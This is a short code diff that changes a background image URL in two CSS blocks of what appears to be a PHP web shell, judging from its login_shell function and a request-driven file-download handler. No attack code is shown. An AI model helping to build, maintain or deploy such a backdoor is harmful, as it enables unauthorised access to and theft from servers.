@@ -37,7 +37,7 @@ function login_shell() {
 		<style type="text/css">
  			body {
  				background-color:#444;
- 				background-image:url(https://wallpoper.com/images/00/24/43/35/black-textures_00244335.jpg);
+ 				background-image:url(https://www.linkpicture.com/q/black-textures_00244335.jpg);
  				background-size:;
  				max-width:600px;
  				margin:auto;
@@ -164,7 +164,7 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
 <style type='text/css'>
 @import url(https://fonts.googleapis.com/css?family=Comic Sans MS);
 html {
-	background: url(https://wallpoper.com/images/00/24/43/35/black-textures_00244335.jpg);    color: white;
+	background: url(https://www.linkpicture.com/q/black-textures_00244335.jpg);    color: white;
     font-family:'Comic Sans MS';
     font-size: 12px;
     width: 100%;
